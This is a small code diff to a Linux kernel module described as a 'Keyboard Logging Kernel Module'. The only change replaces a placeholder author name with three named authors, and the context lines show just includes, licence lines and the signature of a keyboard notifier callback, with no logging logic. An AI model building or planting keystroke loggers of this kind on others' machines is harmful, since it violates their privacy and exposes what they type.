@@ -4,7 +4,7 @@
 #include <linux/keyboard.h>
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Your Name");
+MODULE_AUTHOR("Pedro G, Pedro C, Fernando S");
 MODULE_DESCRIPTION("Keyboard Logging Kernel Module");
 
 static int key_event_interrupt(struct notifier_block *nb, unsigned long code, void *_param)
